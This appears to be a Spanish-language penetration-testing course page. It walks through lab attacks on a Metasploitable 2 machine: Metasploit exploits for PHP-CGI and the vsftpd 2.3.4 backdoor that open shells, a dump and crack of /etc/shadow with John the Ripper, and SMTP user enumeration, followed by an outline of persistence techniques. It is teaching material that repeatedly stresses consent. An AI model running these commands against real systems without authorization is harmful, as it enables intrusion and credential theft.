[https://www.shodan.io/](https://www.shodan.io/domain/achirou.com)

![shodan](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/shodan.png?raw=true)

[https://www.shodan.io/host/191.96.144.129](https://www.shodan.io/host/191.96.144.129)

![shodan 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/shodan1.png?raw=true)

## **BuiltWith**

[https://builtwith.com/](https://builtwith.com/detailed/achirou.com)

BuiltWith es una herramienta de creación de perfiles de sitios web, generación de leads, análisis competitivo e inteligencia empresarial que proporciona adopción de tecnología, datos de comercio electrónico y análisis de uso de Internet.

El seguimiento de tecnología de BuiltWith incluye widgets, análisis, marcos, sistemas de gestión de contenido, anunciantes, redes de entrega de contenido, estándares web y servidores web, por nombrar algunas de las categorías de tecnología que cubrimos.

![BuiltWith](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/builtwith.png?raw=true)

## **Prueba del servidor SSL**

Este servicio online gratuito realiza un análisis profundo de la configuración de cualquier servidor web SSL en Internet

[https://www.ssllabs.com/](https://www.ssllabs.com/ssltest/analyze.html?d=achirou)

![ssllabs](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ssllabs.png?raw=true)

# 4. Detección y explotación de vulnerabilidades:

# **Identificación y explotación de vulnerabilidades conocidas.**

La identificación y explotación de vulnerabilidades conocidas es una fase crítica en las pruebas de penetración, y se lleva a cabo después de recopilar información sobre el objetivo y de identificar posibles debilidades en los sistemas y servicios. Aquí se describen pasos generales y algunas técnicas comunes utilizadas en esta fase:

- **Base de Datos de Vulnerabilidades:** Utilizar bases de datos de vulnerabilidades, como el NIST National Vulnerability Database (NVD) o el Common Vulnerabilities and Exposures (CVE), para identificar vulnerabilidades conocidas.
- **Escaneo de Vulnerabilidades:** Utilizar herramientas automatizadas como Nessus, OpenVAS, o Nexpose para realizar escaneos de vulnerabilidades en los sistemas y servicios objetivo.
- **Análisis de Resultados:** Revisar los informes generados por las herramientas de escaneo de vulnerabilidades para identificar las debilidades detectadas y evaluar su criticidad.
- **Priorización de Vulnerabilidades:** Clasificar las vulnerabilidades identificadas según su gravedad y su impacto potencial en la seguridad del sistema.
- **Validación Manual:** Validar manualmente las vulnerabilidades identificadas para confirmar su existencia y evaluar la posibilidad de explotación.
- **Explotación Controlada:** En caso de contar con autorización explícita, realizar pruebas de explotación controlada para verificar la efectividad de las vulnerabilidades identificadas.
- **Documentación de Hallazgos:** Documentar de manera detallada todas las vulnerabilidades identificadas, incluyendo información sobre su naturaleza, impacto y recomendaciones para la mitigación.

Es importante llevar a cabo estas actividades dentro del alcance ético y legal de la prueba, obteniendo siempre el consentimiento del propietario del sistema o red. Además, la comunicación transparente de los hallazgos es crucial para facilitar la mitigación y mejorar la seguridad del entorno evaluado.

## **Tipos de explotación de vulnerabilidades**

Existen muchos tipos de explotación de vulnerabilidades:

> **1. Vulnerabilidades de aplicación**: Estas vulnerabilidades están relacionadas con los errores de programación en la aplicación. Esto puede permitir que un atacante explote el código vulnerable para comprometer la seguridad de la misma. Estas vulnerabilidades generalmente se encuentran en el lado del cliente, como sitios web, aplicaciones móviles, aplicaciones de escritorio y aplicaciones de servidor.
> 
> **2. Vulnerabilidades de red:** Estas vulnerabilidades se encuentran en el nivel de red debido a la mala configuración de los firewalls, protocolos y servicios en la infraestructura. Esto puede permitir que un atacante explote la red para obtener acceso no autorizado.
> 
> **3. Vulnerabilidades de servidor:** Estas vulnerabilidades se encuentran en los servidores y están relacionadas con la mala configuración de los servidores. Esto puede permitir que un atacante explote el servidor para obtener acceso no autorizado.
> 
> **4. Vulnerabilidades de software:** Estas vulnerabilidades se encuentran en el software instalado en el sistema. Esto puede permitir que un atacante explote las vulnerabilidades del mismo para obtener acceso no autorizado.
> 
> **5. Vulnerabilidades de hardware:** Estas vulnerabilidades se encuentran en el hardware de la computadora. Esto puede permitir que un atacante explote el hardware para obtener acceso no autorizado.
> 

## **Recomendaciones importantes**

Es importante entender cómo combatir estos tipos de explotación de vulnerabilidades. Aquí te dejamos algunas recomendaciones:

> • Implementar controles de seguridad efectivos, como firewalls, antivirus, antispam y herramientas de filtrado de contenido.
> 
> - Monitorear los sistemas de forma continua para detectar y responder a los intentos de explotación de vulnerabilidades.
> - Asegurarse de que todos los sistemas estén actualizados y las vulnerabilidades sean mitigadas de forma adecuada.
> - Utilizar una solución de seguridad que se centre en la prevención, incluso si se detectan intentos de explotación.
> - Realizar pruebas de Hacking Ético o Ethical Hacking periódicas para detectar vulnerabilidades o fallos de seguridad.
> - Utilizar soluciones de seguridad basadas en la nube para mejorar la seguridad y la gestión de los sistemas.
> - Proporcionar educación y capacitación a los usuarios finales para reducir los riesgos de explotación de vulnerabilidades.

La mejor manera de protegerse de la explotación de vulnerabilidades es mediante la implementación de buenas prácticas de seguridad y la adopción de soluciones de seguridad eficaces. Por lo tanto, es importante tomar medidas cómo las anteriores para protegerse de un ciberataque.

# **Uso de exploits y herramientas automatizadas.**

El uso de exploits y herramientas automatizadas es una parte esencial de las pruebas de penetración, pero debe llevarse a cabo con responsabilidad y ética. Aquí se describen las consideraciones y pasos generales para el uso de exploits y herramientas automatizadas en el contexto de una evaluación de seguridad:

- **Consentimiento del Propietario:** Obtener el consentimiento explícito del propietario del sistema o red antes de utilizar exploits o realizar pruebas de penetración.
- **Entendimiento del Alcance:** Clarificar y entender claramente el alcance de la prueba, incluyendo los sistemas y servicios específicos que están autorizados para ser evaluados.
- **Documentación Detallada:** Documentar de manera detallada cada acción realizada, incluyendo el uso de exploits y herramientas automatizadas, junto con sus resultados.
- **Mitigación de Riesgos:** Evaluar y mitigar cualquier riesgo potencial asociado con el uso de exploits, asegurándose de no causar daño irreparable.
- **Priorización de Vulnerabilidades:** Priorizar el uso de exploits en función de la gravedad y el impacto potencial de las vulnerabilidades identificadas.

## **Paso a paso**

- **Identificación de Vulnerabilidades:** Utilizar herramientas de escaneo y análisis para identificar vulnerabilidades en sistemas y servicios.
- **Selección de Exploits:** Seleccionar exploits específicos que sean relevantes para las vulnerabilidades identificadas.
- **Pruebas Controladas:** Realizar pruebas de penetración controladas utilizando exploits, asegurándose de no causar daño no autorizado.
- **Validación Manual:** Validar manualmente la existencia de las vulnerabilidades y la efectividad de los exploits utilizados.
- **Documentación de Resultados:** Documentar los resultados de las pruebas, incluyendo detalles sobre la explotación exitosa o cualquier problema encontrado.
- **Comunicación Transparente:** Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, los resultados obtenidos y las recomendaciones de mitigación.

## **Herramientas Comunes para Uso de Exploits y Automatización:**

**Metasploit:** Marco de desarrollo de pruebas de penetración con una amplia variedad de módulos de exploits.

> Uso: Pruebas controladas de explotación para validar vulnerabilidades.

**ExploitDB:** Base de datos de exploits y técnicas de penetración.

> Uso: Búsqueda y selección de exploits específicos.

**AutoSploit:** Herramienta de automatización que selecciona exploits de manera automática.

> Uso: Pruebas automatizadas de vulnerabilidades.

**Armitage:** Interfaz gráfica para Metasploit con funciones de automatización.

> Uso: Facilita la gestión y ejecución de exploits.

# **Pruebas de penetración en servicios comunes (por ejemplo, HTTP, FTP).**

Las pruebas de penetración en servicios como HTTP, FTP, SSH, TELNET son esenciales para evaluar la seguridad de un sistema. A continuación, se describen algunos pasos generales y técnicas comunes utilizadas en este tipo de pruebas utilizaremos Metasploit y Metasploitable:

## **HTTP (Servidor Web):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo HTTP en el puerto 80 y HTTPS en el puerto 443.
- **Análisis de Tecnologías Web:** Utilizar herramientas como Wappalyzer o BuiltWith para identificar las tecnologías y plataformas web utilizadas en el servidor.
- **Enumeración de Directorios y Archivos:** Utilizar herramientas como dirb, dirbuster o gobuster para enumerar directorios y archivos en el servidor web.
- **Escaneo de Vulnerabilidades Web:** Utilizar herramientas como Nikto o OWASP ZAP para realizar escaneos de vulnerabilidades en la aplicación web.
- **Explotación de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas, utilizar exploits apropiados para verificar la explotación controlada.
- **Inyección de SQL y XSS:** Probar la seguridad contra inyecciones SQL y ataques de scripting entre sitios (XSS) utilizando herramientas como SQLMap o Burp Suite.

El puerto 80 es el puerto predeterminado para los servicios http (páginas web). En un análisis anterior determinamos que el puerto 80 está abierto. Ahora es el momento de determinar qué se ejecuta detrás de ese puerto.

Buscamos cual es la IP. En este caso es 192.168.1.49.

![IP caso](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ipcaso.png?raw=true)

Primero haz un escaneo de nmap:

> Db_nmap -sV 192.168.1.49 -p 80

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

Es Apache ejecutándose en Ubuntu. Intentemos recopilar más información con un escáner auxiliar:

> use auxiliary/scanner/http/http_version
> 
> 
> *> show options*
> 

![Db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> *set RHOST 192.168.1.49*
> 
> 
> *> run*
> 

![RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/RHOST.png?raw=true)

Es Apache 2.2.8 con PHP 5.2.4. Podemos navegar hasta ' [http://192.168.231.109/phpinfo.php](http://metasploitable/phpinfo.php) ' y confirmar la información ya recopilada:

![Apache](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache.png?raw=true)

Probemos otros módulos http para obtener más información sobre nuestro servidor:

'dir_listing' determinará si el listado de directorios está habilitado:

*> use auxiliary/scanner/http/dir_listing*

*> show options*

![Show options](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-options.png?raw=true)

*set RHOST 192.168.1.49*

*> run*

![Run](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run.png?raw=true)

Sin suerte. 'dir_scanner' buscará directorios interesantes:

*> use auxiliary/scanner/http/dir_scanner*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run Set](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-set.png?raw=true)

Tenemos 6 directorios. Revisar su contenido podría darnos una ventaja para hackear nuestro objetivo. Probemos con otro módulo, 'files_dir':

*> use auxiliary/scanner/http/files_dir*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run RHOST](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-rhost.png?raw=true)

Una vez más, estos resultados podrían marcar la diferencia y deberíamos echarles un vistazo. Otro módulo de interés id 'options', 'robots_txt' y 'verb_auth_bypass':

*> use auxiliary/scanner/http/verb_auth_bypass*

*> show options*

*set RHOST 192.168.1.49*

*> run*

![Run proxies](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-proxies.png?raw=true)

> Y muchos módulos más que te invito a probar.
> 
> 
> Hagamos uso de la información que recopilamos.
> 
> Busquemos en exploitDB Apache con la versión de PHP:
> 
> *$ searchsploit apache | grep 5.4.2*
> 

![Apache1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache1.png?raw=true)
Se encontró ejecución remota de código CGI. Explotémoslo:

*> use exploit/multi/http/php_cgi_arg_injection*

*set RHOST 192.168.1.49*

*>run*

![Run Exploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run-exploit.png?raw=true)

¡¡Tenemos un shell meterpreter!! ¡¡¡Happy hacking!!!

El puerto 80 es una buena fuente de información y aprovecha como cualquier otro puerto. Volveremos a este puerto para las aplicaciones web instaladas. En este artículo obtuvimos información sobre los servicios en ejecución y encontramos un exploit que nos proporcionó un shell.

## **FTP (Protocolo de Transferencia de Archivos):**

- **Escaneo de Puertos:** Utilizar herramientas como Nmap para identificar servicios activos, incluyendo FTP en el puerto 21.
- **Enumeración de Usuarios Anónimos:** Verificar si el servidor FTP permite conexiones anónimas y si ofrece acceso a información sensible.
- **Intentos de Acceso No Autorizado:** Intentar acceder al servidor FTP con credenciales débiles o por defecto para evaluar la seguridad de autenticación.
- **Escaneo de Directorios:** Utilizar herramientas como Nmap o dirb para escanear directorios en el servidor FTP.
- **Transferencia de Archivos:** Subir y descargar archivos para evaluar la integridad del control de acceso y la seguridad del sistema.
- **Explotación de Vulnerabilidades Conocidas:** Si se encuentran vulnerabilidades conocidas en el servidor FTP, utilizar exploits apropiados para verificar la explotación controlada.

## **Escaneo y ataque del puerto 21 con Metasploitable 2**

Comprobemos el estado de la base de datos, creemos nuestro espacio de trabajo y configuremos nuestros RHOSTS globales, para no ingresarlos en cada intento:

![Escaneo y Ataque](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/escaneo-ataque.png?raw=true)

Comenzaremos con el puerto 21, el puerto predeterminado de ftp.

Dentro del marco de metasploit, ejecutaremos un análisis del servicio nmap dirigido al puerto 21:

> > db_nmap -p 21 192.168.231.109 -A -sV -sC
> 

MSF también dispone de un módulo auxiliar para ftp:

> > use auxiliary/scanner/ftp/ftp_version
> 
> 
> *> run*
> 

![auxiliary](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/auxiliary.png?raw=true)

*Veamos los resultados de nuestro escaneo de puertos:*

# Untitled

*Veamos los resultados de nuestro escaneo de puertos:*

![resultado Puertos](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/resultado-puertos.png?raw=true)

*Disponemos de un Servidor FTP, concretamente vsFTP 2.3.4. correr. Hagamos una búsqueda en exploitDB a través de searchploit:*

> $ searchsploit vsftp

![searchsploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/searchsploit.png?raw=true)

*Como podemos ver, existe un exploit de ejecución de comandos de puerta trasera para nuestra versión de vsftp. Volvamos a MSF, busquemos el exploit, carguemoslo, veamos su información y ejecútelo:*

> grep vsftp search exploits

![grep vsftp](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/grep-vsftp.png?raw=true)

> use exploit/unix/ftp/vsftp_234_backdoor

> *show info*

![show info](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show-info.png?raw=true)

> run

![run3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/run3.png?raw=true)

*Y ahora tenemos un shell en la sesión 2. Podemos enviarlo al fondo (^Z), enumerar las sesiones abiertas (sesiones -l) e interactuar (sesiones 2)*

![Sesiones](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sesiones.png?raw=true)

*Intentaremos extraer usuarios y contraseñas del objetivo utilizando el módulo hashdump. Ponga la sesión en segundo plano y seleccione el módulo:*

![Hashdump](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/hashdump.png?raw=true)

> use post/linux/gather/hashdump

> *show options*

> *set SESSION 2*

> *show info*

> *run*

*Ahora usa el comando 'loot' para ver los resultados hasta el momento:*

> loot

![loot](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/loot.png?raw=true)

*Pudimos obtener los archivos passwd, shadow y unshadow.*

*Abra otra terminal para que John el Destripador los abra:*

> $ john .msf4/loot/20190402110303_metasploitable2_192.168.231.109_linux.hashes_935091.txt

*Para ver los resultados utilice la opción --show:*

![show](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/show.png?raw=true)

*Escaneamos el puerto 21 y determinamos que una versión vulnerable estaba ejecutando el servicio FTP. Usando MSF pudimos:*

- *crear una sesión remota,*
- *obtener los archivos /etc/passwd y /etc/shadow*
- *obtener credenciales de acceso usando John the Ripper*

## ***Puerto 25 SMTP (Simple Mail Transfer Protocol)***

*Las pruebas de penetración en SMTP (Simple Mail Transfer Protocol) son esenciales para evaluar la seguridad de los servidores de correo electrónico. A continuación, se describen las fases clave de las pruebas de penetración en SMTP:*

- *Reconocimiento:*
    - *Identificación del servidor SMTP: Determina las direcciones IP y los nombres de dominio asociados con el servidor de correo electrónico objetivo.*
    - *Enumeración de usuarios: Recopila información sobre usuarios válidos, lo que podría facilitar ataques de fuerza bruta o de diccionario.*
- *Análisis de Configuración:*
    - *Verificación de restricciones de acceso: Evalúa las políticas de acceso, como las restricciones basadas en direcciones IP.*
    - *Validación de filtrado de contenido: Asegura que el servidor filtre contenido malicioso y maneje adecuadamente los archivos adjuntos.*
- *Ataques de Fuerza Bruta: Realiza intentos de inicio de sesión con contraseñas comunes o débiles para evaluar la resistencia del sistema.*
- *Verificación de Autenticación: Autenticación segura: Confirma que las políticas de autenticación, como STARTTLS, se implementan de manera segura.*
- *Pruebas de Relay Abierto: Comprueba si el servidor permite el reenvío de correos electrónicos sin autenticación, lo cual puede ser explotado por atacantes.*
- *Ataques de Inyección de Correo Electrónico: Evalúa la capacidad del servidor para resistir ataques de manipulación de encabezados de correo electrónico.*
- *Inyección de contenido: Verifica la resistencia a la inyección de contenido malicioso en el cuerpo del correo electrónico.*
- *Exploración de Vulnerabilidades: Identifica posibles servicios relacionados con el correo electrónico que podrían tener vulnerabilidades.*
- *Pruebas contra servidores web asociados: Evalúa la seguridad de aplicaciones web relacionadas con el correo electrónico.*
- *Análisis de Reglas Antispam: Intenta enviar correos electrónicos maliciosos sin ser detectado por los filtros antispam.*
- *Retención y eliminación de mensajes: Verifica si el servidor sigue las políticas de retención y eliminación de mensajes.*
- *Documentación detallada: Proporciona informes detallados de las vulnerabilidades encontradas, junto con recomendaciones para su mitigación.*
- *Las pruebas de penetración en SMTP son fundamentales para garantizar la integridad y la seguridad de las comunicaciones por correo electrónico en una organización.*

## ***Escaneo y ataque del puerto 25 con Metasploitable 2***

*Nuestra primera tarea es determinar qué software y versión se ejecuta detrás del puerto 25. Usemos nmap:*

> db_nmap -p 25 -sC -sV -A 192.168.231.109

![db_nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/db_nmap.png?raw=true)

> use auxiliary/scanner/smtp/smtp_version

*Después de ejecutar el módulo, aquí están los resultados:*

![smtp_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp_version.png?raw=true)

*Como hicimos en la parte II, busquemos en exploitDB, google, etc.*

*MSF tiene un módulo de enumeración de usuarios para SMTP.*

> use auxiliar/scanner/smtp/smtp_enum
> *run*

![SMTP](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp.png?raw=true)

*El módulo pudo extraer una lista de usuarios. Ahora podemos intentar entrar por la fuerza bruta con estos usuarios.*

## ***Comandos SMTP 25***

*SMTP significa Protocolo simple de transporte de correo y es un protocolo de servidor a servidor y mantiene una base de datos local de usuarios a los que debe enviar y recibir correos electrónicos.*

*SMTP tiene un conjunto de comandos ( [véalos aquí](http://www.tcpipguide.com/free/t_SMTPCommands-2.htm) ). Nos conectaremos a nuestro objetivo a través del puerto 25 e intentaremos adquirir los correos electrónicos de esta base de datos. Abra una nueva terminal y escriba:*

> $nc 192.168.231.109 25

*Ya estamos dentro. Usemos el comando 'VRFY' para enumerar los usuarios:*

> *VRFY user*

![VRFY](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/vrfy.png?raw=true)

*En lugar de hacer esto a mano, usemos una herramienta de nuestro cinturón de herramientas: smtp-user-enum.*

![smtp-user-enum](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/smtp-user-enum.png?raw=true)

*Ejecutando la opción '-h' podemos ver el uso. Usaremos una lista de palabras de Kali:*

> $ smpt-users-enum -M VRFY -U /usr/share/wordlist/fern-wifi -t 192.168.231.109

![wordlist](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wordlist.png?raw=true)

*Hemos escaneado el puerto 25 (SMTP). Después de obtener más información sobre el servicio, decidimos intentar enumerar los usuarios existentes, lo que hicimos primero con el marco metasploit y luego con la herramienta smtp-users-enum.*

# ***Consideraciones Generales:***

- *Consentimiento del Propietario: Obtener el consentimiento explícito del propietario del sistema antes de realizar pruebas de penetración.*
- *Uso de Herramientas Especializadas: Utilizar herramientas especializadas, como Hydra para SSH y Telnet, o CrackMapExec para SMB y RDP, para realizar pruebas controladas.*
- *Documentación Detallada: Documentar cada acción realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.*
- *Comunicación Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.*
- *Es esencial llevar a cabo estas actividades de manera ética y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables.*
- *Seguimiento Ético y Legal: Realizar todas las actividades dentro de los límites éticos y legales, evitando cualquier daño no autorizado.*

5. Escalada de privilegios:

# **Búsqueda de vulnerabilidades de escalada de privilegios.**

La búsqueda de vulnerabilidades de escalada de privilegios es crucial para evaluar la seguridad de un sistema y prevenir posibles amenazas. Aquí se describen algunos pasos y técnicas comunes utilizadas para identificar vulnerabilidades que podrían permitir a un atacante elevar sus privilegios:

- **Recolección de Información:** Obtener información detallada sobre el sistema, incluyendo la versión del sistema operativo, servicios en ejecución y configuraciones de seguridad.
- **Enumeración de Usuarios y Grupos:** Utilizar comandos y herramientas como whoami, id, o net user para enumerar usuarios y grupos en el sistema.
- **Revisión de Políticas de Seguridad:** Examinar las políticas de seguridad del sistema para comprender las restricciones y configuraciones de acceso.
- **Análisis de Configuraciones:** Revisar las configuraciones de seguridad, como permisos de archivos, configuraciones de servicios y políticas de control de acceso.
- **Búsqueda de Vulnerabilidades Conocidas:** Utilizar bases de datos de vulnerabilidades, escáneres de vulnerabilidades y herramientas como Nessus o OpenVAS para identificar vulnerabilidades conocidas.
- **Pruebas Activas de Escalada de Privilegios:** Realizar pruebas activas, como intentos de explotación, para identificar vulnerabilidades que podrían conducir a la escalada de privilegios.

## **Técnicas Comunes:**

- **Elevación de Privilegios del Usuario:** Buscar vulnerabilidades que permitan a un usuario regular elevar sus privilegios a niveles más altos.
- **Explotación de Servicios y Aplicaciones:** Buscar vulnerabilidades en servicios y aplicaciones que podrían permitir la ejecución de código con privilegios elevados.
- **Ataques a Configuraciones Débiles:** Identificar configuraciones de seguridad débiles o malas prácticas que puedan ser explotadas para la escalada de privilegios.
- **Escalada de Privilegios a Nivel de Sistema:** Buscar vulnerabilidades que permitan a un usuario obtener privilegios de administrador o de sistema.
- **Explotación de Servidores:** Investigar vulnerabilidades específicas de servidores que puedan ser explotadas para la escalada de privilegios.

## **Herramientas Comunes:**

- **Windows-Exploit-Suggester:** Herramienta para identificar posibles exploits en sistemas Windows.
    - **Uso:** Búsqueda de exploits para versiones específicas de Windows.
- **Linux Exploit Suggester:** Herramienta para identificar posibles exploits en sistemas Linux.
    - **Uso:** Búsqueda de exploits para versiones específicas de sistemas Linux.
- **PowerUp:** PowerShell script para enumerar información y buscar vulnerabilidades en sistemas Windows.
    - **Uso:** Identificación de posibles vectores de escalada de privilegios.
- **BeRoot:** Herramienta para verificar configuraciones y buscar vulnerabilidades en sistemas Linux.
    - **Uso:** Búsqueda de debilidades que podrían conducir a la escalada de privilegios.
    

<aside>
👉 Es crucial llevar a cabo estas actividades de manera ética y responsable, obteniendo siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La comunicación transparente de los hallazgos es fundamental para facilitar la mitigación y mejorar la seguridad del sistema evaluado.

</aside>

# **Uso de técnicas básicas para elevar los privilegios.**

El uso de técnicas básicas para elevar los privilegios es un componente crítico en las pruebas de penetración. Aquí se describen algunas técnicas comunes que los profesionales de seguridad pueden utilizar para identificar y explotar vulnerabilidades que conduzcan a la escalada de privilegios:

1.  Explotación de Servicios Vulnerables: Identificar servicios en ejecución con vulnerabilidades conocidas y utilizar exploits específicos para elevar los privilegios.
2.  Explotación de Configuraciones Débiles: Identificar configuraciones incorrectas o débiles que permitan la escalada de privilegios, como permisos inadecuados en archivos o directorios.
3. Inyección de Comandos: Explotar vulnerabilidades que permitan la inyección de comandos para ejecutar código arbitrario con privilegios elevados.
4.  Explotación de Vulnerabilidades de Día Cero: Utilizar exploits de vulnerabilidades de día cero que aún no han sido parcheadas por el fabricante.
5.  Ataques de Fuerza Bruta: Realizar ataques de fuerza bruta para obtener acceso no autorizado a cuentas de usuario con privilegios más altos.
6.  Uso de Herramientas de Explotación: Utilizar herramientas especializadas como Metasploit, PowerShell Empire o Covenant para automatizar la explotación de vulnerabilidades y la escalada de privilegios.
7.  Explotación de Servidores con Permisos Elevados: Identificar servicios que se ejecutan con privilegios elevados y buscar vulnerabilidades que permitan la manipulación de esos servicios.
8.  Manipulación de Tokens de Acceso: Modificar tokens de acceso para obtener privilegios adicionales en el sistema.
9.  Uso de Exploits para Escalada de Privilegios Específicos del Sistema Operativo: Utilizar exploits específicos para la escalada de privilegios en sistemas operativos particulares, como Windows o Linux.
10.  Explotación de Vulnerabilidades de Aplicaciones Web: Identificar vulnerabilidades en aplicaciones web que permitan la escalada de privilegios a nivel de sistema.

## **Consideraciones Importantes:**

- Consentimiento del Propietario: Obtener el consentimiento explícito del propietario del sistema antes de realizar pruebas de penetración.
- Documentación Detallada: Documentar cada acción realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.
- Seguimiento Ético y Legal: Realizar todas las actividades dentro de los límites éticos y legales, evitando cualquier daño no autorizado.
- Comunicación Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.

<aside>
💡 Es esencial llevar a cabo estas actividades de manera ética y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La escalada de privilegios debe ser realizada con el objetivo de mejorar la seguridad del sistema, identificar debilidades y facilitar la mitigación.

</aside>

# **Obtención de acceso privilegiado en el sistema objetivo**

La escalada de privilegios es el acto de explotar un error, una falla de diseño o la supervisión de la configuración en un sistema operativo o aplicación de software para obtener un acceso elevado a los recursos que normalmente están protegidos de una aplicación o usuario. Vamos a utilizar una distro de Linux vulnerable para poner un ejemplo de elevación de privilegios, se trata de Metasploitable II. Nuestra máquina atacante será un Kali Linux. El proceso que se va a llevar a cabo de manera resumida es el siguiente:

1. Buscamos los servicios que están corriendo en la máquina Metasploitable.
2. Comprobamos si tiene vulnerabilidades.
3. Explotamos la vulnerabilidad que escogemos.
4. Estamos dentro con privilegios limitados, así que buscamos procesos corriendo como root y que no pertenezcan al kernel.
5. Buscamos un exploit que nos permita elevarnos y lo ejecutamos.

### Las máquinas y sus IPs son las siguientes:

- Kali Linux > 192.168.1.50
- Metasploitable II > 192.168.1.49

Buscando servicios en la máquina víctima. Para esta tarea usaremos nmap, el comando a ejecutar:

> nmap -p 1-65535 -T4 -sV 192.168.1.49


Como se va a usar Metasploit, podemos hacer uso de nmap en la propia herramienta (db_nmap), el resultado va a ser el mismo, pero se guardarán los resultados en la base de datos, para no perdernos antes borramos la base de datos con “clear database”. La salida (no completa) se muestra en la siguiente captura:

![captura](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/captura.png?raw=true)

Ahora podemos consultar los servicios todas las veces que queramos con el comando services de Metasploit.

## **Buscamos posibles exploits**

Vamos a centrarnos en el puerto 21, el servicio FTP, y buscamos un posible exploit:

![exploits](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploits.png?raw=true)

Encontramos un exploit disponible para la versión que está corriendo en la máquina víctima. Configuramos el exploit y lo lanzamos:

![exploit disponible](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploit-disponible.png?raw=true)

Ya estamos dentro de la máquina víctima, y encima con el usuario root, que más se puede pedir. En el próximo post veremos que no siempre es tan fácil conseguir altos privilegios, y tendremos que trabajar un poco más para llegar a ello.

# 6. Post-explotación y persistencia

# **Mantenimiento del acceso obtenido en el sistema objetivo.**

El mantenimiento del acceso obtenido en el sistema objetivo es una fase crítica en las pruebas de penetración, donde el objetivo es asegurar la persistencia y continuidad del acceso. Aquí se describen algunas técnicas comunes utilizadas para mantener el acceso en el sistema:

1.  Creación de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para asegurar el acceso incluso si las credenciales originales son revocadas.
2.  Creación de Backdoors: Instalar backdoors en el sistema para permitir el acceso posterior incluso después de que las vulnerabilidades utilizadas inicialmente hayan sido parcheadas.
3.  Programación de Tareas y Servicios: Configurar tareas programadas o servicios que se ejecuten de forma periódica para mantener el acceso persistente.
4.  Uso de Malware Persistente: Implantar malware persistente que se inicie automáticamente con el sistema operativo para mantener el control del sistema.
5.  Modificación de Configuraciones de Seguridad: Cambiar configuraciones de seguridad para permitir el acceso remoto o manipular configuraciones de firewall.
6.  Uso de Túneles Encubiertos: Establecer túneles encubiertos o canales encubiertos para eludir la detección y mantener una comunicación encubierta.
7.  Ofuscación de Actividades: Ofuscar las actividades realizadas para evitar la detección, como cambiar nombres de archivos o enmascarar comandos.
8.  Uso de Certificados Maliciosos: Implementar certificados maliciosos para evadir la detección de herramientas de seguridad.
9.  Uso de Canales Encubiertos en Protocolos Legítimos: Utilizar canales encubiertos en protocolos legítimos, como DNS o HTTP, para pasar desapercibido.
10.  Monitorización de Cambios en el Sistema: Monitorear cambios en el sistema y ajustar las tácticas en respuesta a las actualizaciones de seguridad.

<aside>
📖 En este caso en vez de dar un o unos pocos ejemplos es tema que debemos abordar con mas profundidad. Con lo cual veremos una lista de recursos para profundizar acerca de este tema y que se pueda aprender en mayor profundidad. En esta gran recopilación de técnicas de persistencia podemos verlas mapeadas con Mitre e indicando además si se necesitan permisos o no de administrador en cada una de ellas:

</aside>

| Técnica | Mitre | Permisos de administrador |
| --- | --- | --- |
| https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/ | https://attack.mitre.org/techniques/T1004/ | SI |
| https://pentestlab.blog/2019/10/28/persistence-port-monitors/ | https://attack.mitre.org/techniques/T1013/ | SI |
